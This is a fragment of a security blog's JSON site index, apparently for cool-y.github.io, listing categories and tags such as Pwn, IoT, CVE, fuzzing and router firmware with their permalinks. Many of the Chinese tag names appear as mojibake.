å¥½ï¼æˆ‘æ˜¯æ··å…ƒéœ¹é›³æ‰‹","categories":[],"tags":[]}],"categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://cool-y.github.io/categories/Pwn/"},{"name":"IOT","slug":"IOT","permalink":"https://cool-y.github.io/categories/IOT/"},{"name":"é¡¶ä¼šè®ºæ–‡","slug":"é¡¶ä¼šè®ºæ–‡","permalink":"https://cool-y.github.io/categories/é¡¶ä¼šè®ºæ–‡/"},{"name":"æ‚ä¸ƒæ‚å…«","slug":"æ‚ä¸ƒæ‚å…«","permalink":"https://cool-y.github.io/categories/æ‚ä¸ƒæ‚å…«/"},{"name":"web","slug":"web","permalink":"https://cool-y.github.io/categories/web/"},{"name":"äºŒè¿›åˆ¶","slug":"äºŒè¿›åˆ¶","permalink":"https://cool-y.github.io/categories/äºŒè¿›åˆ¶/"},{"name":"åŠ å¯†è§£å¯†","slug":"åŠ å¯†è§£å¯†","permalink":"https://cool-y.github.io/categories/åŠ å¯†è§£å¯†/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://cool-y.github.io/tags/CVE/"},{"name":"QEMU","slug":"QEMU","permalink":"https://cool-y.github.io/tags/QEMU/"},{"name":"ä¿¡æ¯æ³„éœ²","slug":"ä¿¡æ¯æ³„éœ²","permalink":"https://cool-y.github.io/tags/ä¿¡æ¯æ³„éœ²/"},{"name":"D-LINK","slug":"D-LINK","permalink":"https://cool-y.github.io/tags/D-LINK/"},{"name":"UPnP","slug":"UPnP","permalink":"https://cool-y.github.io/tags/UPnP/"},{"name":"å›ºä»¶æ¨¡æ‹Ÿ","slug":"å›ºä»¶æ¨¡æ‹Ÿ","permalink":"https://cool-y.github.io/tags/å›ºä»¶æ¨¡æ‹Ÿ/"},{"name":"Netgear","slug":"Netgear","permalink":"https://cool-y.github.io/tags/Netgear/"},{"name":"NVRAM","slug":"NVRAM","permalink":"https://cool-y.github.io/tags/NVRAM/"},{"name":"ç¡¬ä»¶æ”»å‡»","slug":"ç¡¬ä»¶æ”»å‡»","permalink":"https://cool-y.github.io/tags/ç¡¬ä»¶æ”»å‡»/"},{"name":"ä¼ æ„Ÿå™¨","slug":"ä¼ æ„Ÿå™¨","permalink":"https://cool-y.github.io/tags/ä¼ æ„Ÿå™¨/"},{"name":"è¯­éŸ³åŠ©æ‰‹","slug":"è¯­éŸ³åŠ©æ‰‹","permalink":"https://cool-y.github.io/tags/è¯­éŸ³åŠ©æ‰‹/"},{"name":"é’“é±¼é‚®ä»¶","slug":"é’“é±¼é‚®ä»¶","permalink":"https://cool-y.github.io/tags/é’“é±¼é‚®ä»¶/"},{"name":"phishing email","slug":"phishing-email","permalink":"https://cool-y.github.io/tags/phishing-email/"},{"name":"web","slug":"web","permalink":"https://cool-y.github.io/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"https://cool-y.github.io/tags/ctf/"},{"name":"äºŒè¿›åˆ¶","slug":"äºŒè¿›åˆ¶","permalink":"https://cool-y.github.io/tags/äºŒè¿›åˆ¶/"},{"name":"Linux","slug":"Linux","permalink":"https://cool-y.github.io/tags/Linux/"},{"name":"CTF","slug":"CTF","permalink":"https://cool-y.github.io/tags/CTF/"},{"name":"å°ç±³","slug":"å°ç±³","permalink":"https://cool-y.github.io/tags/å°ç±³/"},{"name":"è·¯ç”±å™¨","slug":"è·¯ç”±å™¨","permalink":"https://cool-y.github.io/tags/è·¯ç”±å™¨/"},{"name":"è°ƒè¯•","slug":"è°ƒè¯•","permalink":"https://cool-y.github.io/tags/è°ƒè¯•/"},{"name":"IoT","slug":"IoT","permalink":"https://cool-y.github.io/tags/IoT/"},{"name":"ç¡¬ä»¶å±‚","slug":"ç¡¬ä»¶å±‚","permalink":"https://cool-y.github.io/tags/ç¡¬ä»¶å±‚/"},{"name":"linux","slug":"linux","permalink":"https://cool-y.github.io/tags/linux/"},{"name":"pwn","slug":"pwn","permalink":"https://cool-y.github.io/tags/pwn/"},{"name":"æ ˆæº¢å‡º","slug":"æ ˆæº¢å‡º","permalink":"https://cool-y.github.io/tags/æ ˆæº¢å‡º/"},{"name":"Windows","slug":"Windows","permalink":"https://cool-y.github.io/tags/Windows/"},{"name":"æ¼æ´","slug":"æ¼æ´","permalink":"https://cool-y.github.io/tags/æ¼æ´/"},{"name":"AFL","slug":"AFL","permalink":"https://cool-y.github.io/tags/AFL/"},{"name":"æ¨¡ç³Šæµ‹è¯•","slug":"æ¨¡ç³Šæµ‹è¯•","permalink":"https://cool-y.github.io/tags/æ¨¡ç³Šæµ‹è¯•/"},{"name":"é€†å‘","slug":"é€†å‘","permalink":"https://cool-y.github.io/tags/é€†å‘/"},{"name":"ç ´è§£","slug":"ç ´è§£","permalink":"https://cool-y.github.io/tags/ç ´è§£/"},{"name":"æ–‡ä»¶æ ¼å¼","slug":"æ–‡ä»¶æ ¼å¼","permalink":"https://cool-y.github.io/tags/æ–‡ä»¶æ ¼å¼/"},{"name":"PE","slug":"PE","permalink":"https://cool-y.github.io/tags/PE/"},{"name":"MiniUPnP","slug":"MiniUPnP","permalink":"https://cool-y.github.io/tags/MiniUPnP/"},{"name":"æ•°æ®åº“","slug":"æ•°æ®åº“","permalink":"https://cool-y.github.io/tags/æ•°æ®åº“/"},{"name":"å¤åŸæ–‡ä»¶","slug":"å¤åŸæ–‡ä»¶","permalink":"https://cool-y.github.io/tags/å¤åŸæ–‡ä»¶/"},{"name":"å–è¯","slug":"å–è¯","permalink":"https://cool-y.github.io/tags/å–è¯/"},{"name":"Samba","slug":"Samba","permalink":"https://cool-y.github.io/tags/Samba/"},{"name":"è¿œç¨‹æ‰§è¡Œ","slug":"è¿œç¨‹æ‰§è¡Œ","permalink":"https://cool-y.github.io/tags/è¿œç¨‹æ‰§è¡Œ/"},{"name":"itchat","slug":"itchat","permalink":"https://cool-y.github.io/tags/itchat/"},{"name":"å¾®ä¿¡","slug":"å¾®ä¿¡","permalink":"https://cool-y.github.io/tags/å¾®ä¿¡/"},{"name":"SSH","slug":"SSH","permalink":"https://cool-y.github.io/tags/SSH/"},{"name":"å¯†ç ","slug":"å¯†ç ","permalink":"https://cool-y.github.io/tags/å¯†ç /"},{"name":"QQ","slug":"QQ","permalink":"https://cool-y.github.io/tags/QQ/"},{"name":"ä¾§ä¿¡é“æ”»å‡»","slug":"ä¾§ä¿¡é“æ”»å‡»","permalink":"https://cool-y.github.io/tags/ä¾§ä¿¡é“æ”»å‡»/"},{"name":"wifi","slug":"wifi","permalink":"https://cool-y.github.io/tags/wifi/"},{"name":"TCPDUMP","slug":"TCPDUMP","permalink":"https://cool-y.github.io/tags/TCPDUMP/"},{"name":"æ‹’ç»æœåŠ¡æ”»å‡»","slug":"æ‹’ç»æœåŠ¡æ”»å‡»","permalink":"https://cool-y.github.io/tags/æ‹’ç»æœåŠ¡æ”»å‡»/"},{"name":"USENIX","slug":"USENIX","permalink":"https://cool-y.github.io/tags/USENIX/"},{"name":"æ•°æ®æŒ–æ˜","slug":"æ•°æ®æŒ–æ˜","permalink":"https://cool-y.github.io/tags/æ•°æ®æŒ–æ˜/"},{"name":"è‡ªç„¶è¯­è¨€å¤„ç†","slug":"è‡ªç„¶è¯­è¨€å¤„ç†","permalink":"https://cool-y.github.io/tags/è‡ªç„¶è¯­è¨€å¤„ç†/"},{"name":"miio","slug":"miio","permalink":"https://cool-y.github.io/tags/miio/"},{"name":"ä¸­é—´äºº","slug":"ä¸­é—´äºº","permalink":"https://cool-y.github.io/tags/ä¸­é—´äºº/"},{"name":"é‡æ”¾æ”»å‡»","slug":"é‡æ”¾æ”»å‡»","permalink":"https://cool-y.github.io/tags/é‡æ”¾æ”»å‡»/"}]}